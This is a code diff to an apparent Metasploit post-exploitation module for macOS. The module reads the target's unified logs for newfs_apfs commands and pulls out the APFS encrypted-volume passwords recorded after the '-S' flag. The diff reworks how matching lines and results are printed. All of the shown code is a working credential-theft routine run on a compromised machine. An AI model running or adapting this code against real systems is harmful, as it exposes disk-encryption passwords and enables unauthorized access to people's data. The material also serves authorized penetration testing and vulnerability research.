@@ -48,26 +48,25 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    return if check == Exploit::CheckCode::Safe
+    if check == Exploit::CheckCode::Safe
+      print_error "This version of OSX is not vulnerable"
+      return
+    end
     cmd = "log show --info --predicate 'eventMessage contains \"newfs_\"'"
     cmd << " | grep #{datastore['MOUNT_PATH']}" unless datastore['MOUNT_PATH'].empty?
     vprint_status "Running \"#{cmd}\" on target..."
     results = cmd_exec(cmd)
+    vprint_status "Target results:\n#{results}"
     if results.empty?
       print_error 'Got no response from target. Stopping...'
     else
       successful_lines = 0
       results.lines.each do |l|
-        s = l.split(' ')[11..-1].join # Just the command executed
-        next unless s =~ /newfs_apfs/ && s =~ /-S (.+)/
+        next unless l =~ /newfs_apfs(.*)-S(.*)$/
+        print_good "APFS command found: #{$&}"
         successful_lines += 1
-        ss = s.split(' ')
-        flagindex = ss.rindex('-S')
-        print_good "Password found: #{ss[flagindex + 1]}"
       end
-
       print_error "No password(s) found for any volumes. Exiting..." if successful_lines.zero?
-
     end
   end
 end
